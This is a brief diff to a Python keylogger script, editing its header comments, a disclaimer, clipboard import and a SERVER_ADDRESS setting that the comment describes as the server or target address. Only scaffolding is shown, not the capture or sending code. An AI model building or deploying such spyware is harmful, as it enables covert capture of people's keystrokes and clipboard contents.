@@ -1,5 +1,9 @@
 #!/usr/bin/python3
-# Note:
+
+# _*_ coding: utf-8 _*_
+# Tested on Linux (e.g., Linux kali 6.5.0-kali2-amd64)
+
+# Disclaimer:
 # This script is only for ethical and Unauthorized use of keyloggers is illegal.
 
 try:
@@ -18,7 +22,7 @@ except ImportError:
     from pandas import read_clipboard
 
 # Initializing global values
-# Replace with your server's IP address
+# Replace with your server's IP address/Target Address
 SERVER_ADDRESS = ("127.0.0.1", 8080)
 
 class Keylogger:
